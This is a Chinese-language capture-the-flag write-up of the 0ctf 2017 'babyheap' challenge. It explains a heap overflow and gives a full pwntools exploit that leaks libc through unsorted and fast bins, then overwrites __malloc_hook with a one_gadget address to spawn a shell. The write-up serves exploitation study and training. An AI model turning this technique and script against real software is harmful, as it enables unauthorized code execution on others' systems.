# babyheap_0ctf_2017


# 涉及知识

+ Heap Overflow
+ Unsorted bin attack
+ Fastbin attach(Arbitrary Alloc) 

<!--more-->

# 漏洞分析

[题目下载](http://149.28.144.59:8090/upload/2020/4/babyheap-bb18a6ce1f15447191a5333b750ab5e4.)

## 保护机制

![image.png](https://i.loli.net/2020/05/20/rnbIOpUzH6BmSfJ.png)

保护机制全开，心里一咯噔，看来这道题需要泄漏Libc地址。

## 分析程序

程序的逻辑很简单，漏洞也很明显。在读入数据时，读入的个数是用户自己定义，并且没有进行大小限制，所以这里存在堆溢出，可以堆下一个堆块的内容进行覆盖。

![image.png](https://i.loli.net/2020/05/20/oez9S5yXmwDbpZr.png)

## 漏洞利用

由于存在堆溢出，很多堆利用方法都可以使用了，那我们应该使用什么利用方法呢？

由于保护机制全开，程序的加载基址，每次启动时都会不同。如果我们想getshell的话，第一步就是泄漏Libc的地址。如何泄漏呢？我们可以利用Unsorted bin attack。当free掉的堆块大小大于Fast bin处在small bin范围内时，我们知道其fd将会指向main_arena的地址，而这个地址在libc中偏移是固定的，所以泄漏了fd也就泄露了libc。当我们获得libc后，可以在__malloc_hock_周围找一个堆块，来进行fastbin attack（Arbitrary attack），分配成功后，就可以修改__malloc_hock的值。若将其修改为one_gadget，下一次分配将能getshell

总结一下利用思路

+ 利用Unsorted bin attack泄漏Libc

+ 利用Fast bin attack分配__malloc_hock_附件的堆块

+ 修改__malloc_hock_的值为one_gadget

+ 分配堆块，获得shell

下面将按照利用思路一步步的编写exp

### 利用Unsorted bin attack泄漏Libc

首先我们分配4个0x10大小的堆块，一个0x80的堆块，再分配一个0x10的堆块用于隔开Top chunck。

```python
alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4
alloc(0x10) #5
```

我们知道，free掉4后，将会把main_arena的地址写在堆块上，但是我们没有办法把数据读出来。怎么办呢？我们可以利用fast bin 分配一个堆块，其指针指向堆块4，进而我们就可以将main_arena地址读出。
其代码如下

```python
#leack libc
free(1)
free(2)
payload=p64(0)+p64(0)+p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21)+'\x80'
fill(0,len(payload),payload)
payload=p64(0)+p64(0)+p64(0)+p64(0x21)
fill(3,len(payload),payload)
alloc(0x10) #1
alloc(0x10) #2
payload=p64(0)+p64(0)+p64(0)+p64(0x91)
fill(3,len(payload),payload)
free(4)
dump(2)
```

我们调试一下这个过程，来帮助大家更好的理解。

这是最初分配的堆块

![image.png](https://i.loli.net/2020/05/20/GpL64vB72bdKSx1.png)

free掉1和2后

![image.png](https://i.loli.net/2020/05/20/lkfoWpymGNrh32E.png)

若将箭头1处的地址修改为0x562e6e252080，虽然开启了地址随机化，但是地址最后三个字节不会改变，因此我们只需要溢出将0x20改为0x80，再将0x91修改为0x21就可以分配一个fastbin的地址为small bin的地址处。

![image.png](https://i.loli.net/2020/05/20/bXAmvTPQoySIr6G.png)

可以看到，有两个指针指向同一个堆块。而这个堆块就是我们的small bin

![image.png](https://i.loli.net/2020/05/20/lN4SMhXj1FpAw3c.png)

我们再次利用堆溢出，将smallbin的大小恢复为0x91，然后free掉这个堆块。

![image.png](http://149.28.144.59:8090/upload/2020/4/image-aba1560ec23c44c8aa95d52eb604c7e7.png)

free掉smallbin后，其fd和bk将会指向main_arena的地址，通过dump()就可以将main_arena给泄漏出来

利用vmmap我们可以获得libc的基址

![image.png](https://i.loli.net/2020/05/20/HnsT2g56fRjmJO4.png)

如果Libc的基址为0x00007fd6ba201000，我们获得的main_arena地址为0x00007fd6ba5c5b78，main_arena相对libc基址的偏移量为0x00007fd6ba5c5b78-0x00007fd6ba201000=0x3c4b78。我们将泄露的main_arena减去这个偏移量就可以获得libc的基址。到这里我们已经成功地获得了libc_base。

### 利用Fast bin attack分配__malloc_hock_附件的堆块

这一步我们需要在__malloc_hock_附件找一个可以bypass fastbin size验证的堆块。

![image.png](https://i.loli.net/2020/05/20/xvTOkp3Ks56m8oC.png)

![image.png](https://i.loli.net/2020/05/20/NS7Mv8WiFKDe91p.png)

利用错位后，我们可以构造出一个0x7f大小的堆块，即用户数据为0x60大小。如此我们利用fastbin attack就可以分配一个在__malloc_hock附件的堆块。这里的利用我就不贴堆块变化了，和上面的堆块利用变化差不多。直接贴代码。

```python
alloc(0x60) #6
alloc(0x10) #7
free(6)
payload=p64(0)+p64(0)+p64(0)+p64(0x71)+p64(target)
fill(5,len(payload),payload)
alloc(0x60) #6
alloc(0x60) #8
```

### 修改__malloc_hock_的值为one_gadget

利用ona_gadget查找地址。

![image.png](https://i.loli.net/2020/05/20/Rs7ACzPJDgEFw82.png)

这里我利用的是第二个地址。然后用在__malloc_hock_周围分配的堆块，去修改__malloc_hock_的值。这里需要注意计算__malloc_hock_的地址相对于堆块地址的偏移。

```python
payload='a'*0x13+p64(libc_base+0x4526a)
fill(8,len(payload),payload)
```

### 分配堆块，获得shell

最后，随便分配一个堆块，就可以执行one_gadget。

# EXP

```python
#Author:Nop
from pwn import *

sh=process('./pwn2')

def alloc(size):
    sh.recvuntil(':')
    sh.sendline('1')
    sh.recvuntil(':')
    sh.sendline(str(size))

def fill(index,size,content):
    sh.recvuntil(':')
    sh.sendline('2')
    sh.recvuntil(':')
    sh.sendline(str(index))
    sh.recvuntil(':')
    sh.sendline(str(size))
    sh.recvuntil(':')
    sh.send(content)

def free(index):
    sh.recvuntil(':')
    sh.sendline('3')
    sh.recvuntil(':')
    sh.sendline(str(index))

def dump(index):
    sh.recvuntil(':')
    sh.sendline('4')
    sh.recvuntil(':')
    sh.sendline(str(index))

alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4
alloc(0x10) #5

#leack libc
free(1)
free(2)
payload=p64(0)+p64(0)+p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21)+'\x80'
fill(0,len(payload),payload)
payload=p64(0)+p64(0)+p64(0)+p64(0x21)
fill(3,len(payload),payload)
alloc(0x10) #1
alloc(0x10) #2
payload=p64(0)+p64(0)+p64(0)+p64(0x91)
fill(3,len(payload),payload)
free(4)
dump(2)
sh.recvuntil('Content: \n')
topchunk_two=sh.recvline().replace('\n','')
length=len(topchunk_two)
topchunk=u64(topchunk_two[0:length/2])
main_arena=topchunk-0x58
target=main_arena-0x33
libc_base=topchunk-0x3c4b78
log.success('topchunk:'+hex(topchunk))
log.success('libc_base:'+hex(libc_base))
alloc(0x80) #4

alloc(0x60) #6
alloc(0x10) #7
free(6)
payload=p64(0)+p64(0)+p64(0)+p64(0x71)+p64(target)
fill(5,len(payload),payload)
alloc(0x60) #6
alloc(0x60) #8

payload='a'*0x13+p64(libc_base+0x4526a)
fill(8,len(payload),payload)

alloc(0x10)

sh.interactive()
```

# 收获

这道题应该算是堆里面比较简单的题目了，堆溢出的溢出字节是由用户自己控制的。所以堆利用的大多数技术都可以使用，但是要使用哪些技术，并且这些技术如何相互配合。这就是一个比较难的问题。通过这道题也确实对堆利用技术理解更深入了。是一道难得的好题。

### 参考

[UAFIO](https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)

